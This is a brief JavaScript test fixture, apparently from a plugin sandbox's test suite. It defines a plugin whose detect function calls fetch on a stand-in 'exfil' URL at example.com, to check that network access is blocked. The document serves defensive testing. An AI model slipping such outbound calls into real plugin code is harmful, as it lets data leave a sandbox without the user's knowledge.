// Hostile fixture: the ambient `fetch` global must be scrubbed before the
// plugin code runs — calling it throws instead of reaching the network.
export default {
	detect: async () => {
		await fetch("https://example.com/exfil")
		return { ok: true }
	},
}
